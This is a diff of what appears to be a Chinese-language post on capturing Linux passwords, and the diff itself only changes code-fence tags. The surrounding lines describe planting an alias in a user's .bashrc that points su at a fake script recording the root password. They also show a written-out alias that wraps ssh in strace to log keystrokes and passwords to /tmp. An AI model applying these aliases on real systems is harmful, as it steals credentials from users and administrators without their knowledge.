@@ -18,7 +18,7 @@ tags:
 
 在一个低权限用户目录下的.bashrc添加一句alias su='/usr/root.py'，低权限用户su root后成功记录密码，但使用这种方法后管理员无法正常su切换至root用户下，所以比较容易被管理员发现。密码记录路径请看脚本。 
 
-```
+```python
 #!/usr/bin/python
 # -*- coding: cp936 -*-
 
@@ -48,7 +48,7 @@ print fail_str                               //打印切换root失败提示
 
 同样编辑当前用户下的.bashrc文件,添加以下内容，然后使用source .bashrc 命令使配置生效，当ssh的时候,就会在tmp下面生成记录
 
-```
+```basic
 alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh' 
 ```
 
